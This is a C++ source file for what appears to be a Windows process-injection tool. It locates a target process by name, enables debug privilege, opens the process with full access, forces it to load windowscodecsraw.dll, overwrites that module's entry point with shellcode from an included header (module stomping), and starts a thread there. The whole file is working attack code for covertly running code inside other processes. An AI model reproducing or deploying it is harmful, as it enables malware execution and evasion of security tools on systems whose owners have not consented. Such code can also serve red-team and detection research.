#include "pch.h"

#include "../injectionUtils/public.h"
#include "shellcode.h"

void doUsage()
{
	printf("Usage: inject_simple.exe <target process name>\n");
}

int wmain(int argc, TCHAR *argv[])
{
	if (argc != 3)
	{
		doUsage();
		return -1;
	}

	TCHAR* targetProcessName = argv[1];
	DWORD targetPid = getPIDForProcessByName(targetProcessName);
	if (targetPid == 0)
	{
		printf("Can't find process '%S'\n", targetProcessName);
		return -1;
	}

	if (!EnableDebugPrivilege(TRUE))
	{
		printf("Couldn't enable debug privilege\n");
		return -1;
	}

	HANDLE toScanHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_ALL_ACCESS, FALSE, targetPid);
	if (toScanHandle == NULL)
	{
		printf("Couldn't open target process, gle %d\n", GetLastError());
		return -1;
	}

	// First, convince the target to load the library we're going to stomp on top of. We just inject a thread to LoadLibraryA.
	void* moduleToStompBase = injectLoadLibrary(toScanHandle, L"windowscodecsraw.dll");

	moduleInMemory targetModule = moduleInMemory(toScanHandle, moduleToStompBase);

	targetModule.writeToModule(buf, targetModule.entrypoint, sizeof(buf));
	targetModule.injectThread(targetModule.entrypoint, NULL, 0);
}
